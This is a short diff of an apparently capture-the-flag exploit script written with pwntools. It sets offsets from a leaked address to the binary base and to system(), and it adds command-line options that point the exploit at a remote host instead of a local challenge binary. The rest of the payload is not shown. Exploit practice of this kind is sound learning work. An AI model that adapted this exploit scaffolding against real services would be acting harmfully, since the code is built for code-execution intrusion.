@@ -4,7 +4,19 @@ from pwn import *
 BASE = 0xc95  # distance from leak to binary base
 FUNC = 0xa70  # distance from base to system()
 
-io = process('../chall2')
+HOST = ''
+PORT = 0
+
+if len(sys.argv) > 1:
+	HOST = sys.argv[1]
+
+if len(sys.argv) > 2:
+	PORT = sys.argv[2]
+
+if len(HOST) > 0:
+	io = remote(HOST, PORT)
+else:
+	io = process('../chall2')
 
 # mmm ansi art
 print io.recvuntil('\n\n')
